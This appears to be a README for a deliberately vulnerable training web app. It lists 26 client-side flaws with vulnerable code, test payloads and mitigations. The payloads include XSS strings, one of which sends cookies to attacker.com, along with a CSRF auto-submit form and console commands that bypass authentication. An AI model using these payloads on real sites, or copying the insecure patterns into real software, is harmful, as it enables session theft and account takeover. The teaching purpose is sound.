# 🌐 Frontend (Client-Side) Vulnerabilities Guide

This document details all the client-side security vulnerabilities implemented in the frontend application.

## 📋 Table of Contents

- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Client-Side Security Issues](#client-side-security-issues)
- [Insecure Data Storage](#insecure-data-storage)
- [Authentication & Authorization](#authentication--authorization)
- [Information Disclosure](#information-disclosure)
- [Testing Guide](#testing-guide)

---

## 🔴 Cross-Site Scripting (XSS)

### 1. Reflected XSS
**Location**: `index.html` - Search functionality

**Vulnerability**:
```javascript
resultsDiv.innerHTML = `<p>You searched for: ${searchInput}</p>`;
```

**Test**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

**Impact**: Execute arbitrary JavaScript in user's browser

---

### 2. Stored XSS
**Location**: `index.html` - Comments section

**Vulnerability**:
```javascript
comments.push(commentInput); // No sanitization
commentsList.innerHTML = comments.map(c => `<div>${c.text}</div>`).join('');
```

**Test**:
```html
<img src=x onerror=alert('Stored XSS')>
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

**Impact**: Persistent XSS that affects all users viewing comments

---

### 3. DOM-based XSS
**Location**: `index.html` - URL parameter handling

**Vulnerability**:
```javascript
const name = urlParams.get('name');
welcomeDiv.innerHTML = `<h3>Welcome, ${name}!</h3>`;
```

**Test**:
```
?name=<img src=x onerror=alert('DOM XSS')>
?name=<svg/onload=alert('XSS')>
```

**Impact**: XSS triggered by URL manipulation

---

### 4. HTML Injection
**Location**: `index.html` - HTML injection test

**Vulnerability**:
```javascript
outputDiv.innerHTML = htmlInput; // Direct HTML insertion
```

**Test**:
```html
<h1 style="color:red">Injected Content!</h1>
<iframe src="http://evil.com"></iframe>
```

**Impact**: Inject arbitrary HTML/JavaScript

---

## 🔵 Client-Side Security Issues

### 5. Client-Side Authentication
**Location**: `app.js`

**Vulnerability**:
```javascript
const ADMIN_USERNAME = "admin";
const ADMIN_PASSWORD = "admin123"; // Hardcoded in JavaScript!

if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    // Grant access
}
```

**Bypass**:
1. View page source
2. Find credentials in JavaScript
3. Or modify `localStorage.setItem('isAuthenticated', 'true')`

**Impact**: Complete authentication bypass

---

### 6. Client-Side Authorization
**Location**: `dashboard.html`, `admin.html`

**Vulnerability**:
```javascript
const role = localStorage.getItem('role');
if (role !== 'admin') {
    // Show error (but page still loads)
}
```

**Bypass**:
```javascript
localStorage.setItem('role', 'admin');
// Then access /admin.html
```

**Impact**: Unauthorized access to admin functionality

---

### 7. Hardcoded Secrets
**Location**: `app.js`

**Vulnerability**:
```javascript
const API_KEY = "sk_live_51234567890abcdef";
const SECRET_TOKEN = "super_secret_token_12345";
```

**Discovery**: View page source or browser DevTools

**Impact**: API keys and tokens exposed to anyone

---

### 8. Insecure Direct Object References (IDOR)
**Location**: `dashboard.html`

**Vulnerability**:
```javascript
fetch(`/user/${userId}`); // No authorization check
```

**Test**:
```
/user/1  // View user 1's data
/user/2  // View user 2's data
/user/3  // View user 3's data
```

**Impact**: Access any user's sensitive data

---

## 💾 Insecure Data Storage

### 9. Sensitive Data in localStorage
**Location**: `app.js`

**Vulnerability**:
```javascript
localStorage.setItem('apiKey', API_KEY);
localStorage.setItem('secretToken', SECRET_TOKEN);
localStorage.setItem('userRole', 'admin');
```

**View**:
1. Open DevTools (F12)
2. Application → Local Storage
3. See all sensitive data

**Impact**: Persistent storage of sensitive information

---

### 10. Sensitive Data in sessionStorage
**Location**: `app.js`

**Vulnerability**:
```javascript
sessionStorage.setItem('sessionToken', 'session_' + Date.now());
```

**Impact**: Session tokens accessible via JavaScript

---

### 11. Insecure Cookies
**Location**: `app.js`

**Vulnerability**:
```javascript
document.cookie = "sessionId=12345; path=/"; // No HttpOnly, No Secure
document.cookie = "apiKey=" + API_KEY + "; path=/";
```

**Access**: `document.cookie` in console

**Impact**: Cookies accessible to JavaScript (XSS can steal them)

---

## 🔐 Authentication & Authorization

### 12. No CSRF Protection
**Location**: All forms

**Vulnerability**: No CSRF tokens in any form

**Test**:
```html
<!-- Attacker's page -->
<form action="http://vulnerable-app.com/delete-account" method="POST">
    <input type="hidden" name="confirm" value="yes">
</form>
<script>document.forms[0].submit();</script>
```

**Impact**: Cross-Site Request Forgery attacks

---

### 13. Client-Side Validation Only
**Location**: All forms

**Vulnerability**:
```javascript
if (input.length < 3) {
    return false; // Only client-side check
}
```

**Bypass**: Disable JavaScript or use browser DevTools

**Impact**: All validation can be bypassed

---

### 14. Password Change Without Current Password
**Location**: `profile.html`

**Vulnerability**: No current password verification

**Impact**: Account takeover if session is compromised

---

### 15. Weak Password Policy
**Location**: `profile.html`

**Vulnerability**:
```javascript
if (newPassword.length < 3) {
    alert('Password too short! (But we accept it anyway)');
}
```

**Impact**: Weak passwords accepted

---

## 📊 Information Disclosure

### 16. Sensitive Data in HTML Comments
**Location**: `dashboard.html`

**Vulnerability**:
```html
<!-- 
    Admin credentials: admin / admin123
    Database connection: mongodb://admin:password@localhost:27017
-->
```

**Discovery**: View page source (Ctrl+U)

**Impact**: Credentials and configuration exposed

---

### 17. Sensitive Data in Console
**Location**: `app.js`

**Vulnerability**:
```javascript
console.log('Admin Password:', ADMIN_PASSWORD);
console.log('API Key:', API_KEY);
```

**View**: Open browser console (F12)

**Impact**: Sensitive information logged to console

---

### 18. Hidden Elements with Sensitive Data
**Location**: `index.html`

**Vulnerability**:
```html
<div id="admin-panel" style="display:none;">
    <p>Secret Admin Token: admin_token_12345_secret</p>
</div>
```

**Discovery**: Inspect element or view source

**Impact**: Hidden data still accessible

---

### 19. Client-Side Filtering
**Location**: `dashboard.html`

**Vulnerability**:
```javascript
const products = [
    { id: 3, name: 'Secret Product', visible: false }
];
const visibleProducts = products.filter(p => p.visible);
```

**Bypass**: Access `products` array in console

**Impact**: Hidden data accessible in JavaScript

---

### 20. Exposed Functions
**Location**: `app.js`

**Vulnerability**:
```javascript
window.vulnerableFunctions = {
    executeCode,
    checkPassword,
    demonstrateXSS
};
```

**Access**: `window.vulnerableFunctions.executeCode('alert(1)')`

**Impact**: Internal functions exposed globally

---

## 🔧 Additional Vulnerabilities

### 21. Prototype Pollution
**Location**: `app.js`

**Vulnerability**:
```javascript
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key]; // No __proto__ check
    }
}
```

**Exploit**:
```javascript
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
```

---

### 22. Insecure Random Generation
**Location**: `app.js`

**Vulnerability**:
```javascript
function generateToken() {
    return 'token_' + Math.random().toString(36); // Not cryptographically secure
}
```

**Impact**: Predictable tokens

---

### 23. Timing Attack Vulnerability
**Location**: `app.js`

**Vulnerability**:
```javascript
function checkPassword(input) {
    for (let i = 0; i < correctPassword.length; i++) {
        if (input[i] !== correctPassword[i]) {
            return false; // Early return reveals position
        }
    }
}
```

**Impact**: Password can be guessed character by character

---

### 24. Open Redirect
**Location**: `app.js`

**Vulnerability**:
```javascript
function redirect(url) {
    window.location.href = url; // No validation
}
```

**Exploit**: `redirect('http://evil.com')`

---

### 25. No Content Security Policy
**Location**: All pages

**Vulnerability**: Missing CSP headers

**Impact**: Inline scripts and eval allowed

---

### 26. Clickjacking
**Location**: All pages

**Vulnerability**: No frame-busting code

**Test**:
```html
<iframe src="http://vulnerable-app.com"></iframe>
```

**Impact**: Page can be embedded in iframe

---

## 🧪 Testing Guide

### Quick Test Commands

#### 1. Test Reflected XSS
```javascript
// In search box
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

#### 2. Test Stored XSS
```javascript
// In comment box
<img src=x onerror=alert('Stored XSS')>
<svg/onload=alert('XSS')>
```

#### 3. Test DOM XSS
```
URL: ?name=<img src=x onerror=alert('DOM XSS')>
```

#### 4. Bypass Client-Side Auth
```javascript
// In browser console
localStorage.setItem('isAuthenticated', 'true');
localStorage.setItem('role', 'admin');
localStorage.setItem('username', 'admin');
```

#### 5. View Stored Secrets
```javascript
// In browser console
console.log(localStorage);
console.log(sessionStorage);
console.log(document.cookie);
```

#### 6. Access Hidden Data
```javascript
// In browser console
document.getElementById('admin-panel').style.display = 'block';
```

#### 7. View All Products (Including Hidden)
```javascript
// In browser console (on dashboard.html)
console.log(products);
showAllProducts();
```

#### 8. Execute Exposed Functions
```javascript
// In browser console
window.vulnerableFunctions.demonstrateXSS();
window.vulnerableFunctions.executeCode('alert("Code executed")');
```

---

## 🛡️ Mitigation Strategies

### For XSS:
- ✅ Use `textContent` instead of `innerHTML`
- ✅ Sanitize all user input
- ✅ Implement Content Security Policy
- ✅ Use DOMPurify or similar libraries

### For Authentication:
- ✅ Never store credentials in JavaScript
- ✅ Always validate on server-side
- ✅ Use secure session management
- ✅ Implement proper CSRF protection

### For Data Storage:
- ✅ Never store sensitive data in localStorage/sessionStorage
- ✅ Use HttpOnly and Secure flags for cookies
- ✅ Encrypt sensitive data if storage is necessary

### For Authorization:
- ✅ Always check permissions on server-side
- ✅ Never rely on client-side checks
- ✅ Implement proper access control

### General Best Practices:
- ✅ Minimize client-side logic
- ✅ Validate everything on server
- ✅ Use security headers
- ✅ Regular security audits
- ✅ Keep dependencies updated

---

## 📚 Learning Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [OWASP Client-Side Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## ⚠️ Disclaimer

All vulnerabilities in this application are intentional and for educational purposes only. Never implement these patterns in production applications!

---

**Total Client-Side Vulnerabilities: 26+**

**Severity Breakdown:**
- 🔴 Critical: 15
- 🟠 High: 8
- 🟡 Medium: 3
